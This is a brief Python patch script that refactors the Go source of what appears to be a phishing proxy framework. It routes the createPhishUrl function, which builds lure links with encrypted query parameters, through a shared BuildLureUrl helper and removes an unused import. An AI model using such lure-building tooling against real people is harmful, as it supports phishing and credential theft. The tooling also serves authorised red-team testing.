#!/usr/bin/env python3
# patch_wave1.py — Wave 1: terminal.createPhishUrl delegates to shared BuildLureUrl.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:160]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

patch("core/terminal.go",
      "func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {\n"
      "\tvar ret string = base_url\n"
      "\tif len(*params) > 0 {\n"
      "\t\tkey_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))\n"
      "\n"
      "\t\tdec_params := params.Encode()\n"
      "\n"
      "\t\tkey_val, enc_err := EncryptLureParams(t.cfg.LureKey(), dec_params)\n"
      "\t\tif enc_err != nil {\n"
      "\t\t\tlog.Error(\"lure params: encryption failed: %v\", enc_err)\n"
      "\t\t\treturn ret\n"
      "\t\t}\n"
      "\t\tret += \"?\" + key_arg + \"=\" + key_val\n"
      "\t}\n"
      "\treturn ret\n"
      "}",
      "func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {\n"
      "\treturn BuildLureUrl(t.cfg, base_url, params)\n"
      "}")

# drop imports that may now be unused in terminal.go
src = open("core/terminal.go", "r", encoding="utf-8").read()
body = src.split(")", 1)[-1] if False else src
if "rand." not in src.replace('"math/rand"', ""):
    if '\t"math/rand"\n' in src:
        patch("core/terminal.go", '\t"math/rand"\n', "")

print("[done] wave1 patches applied")
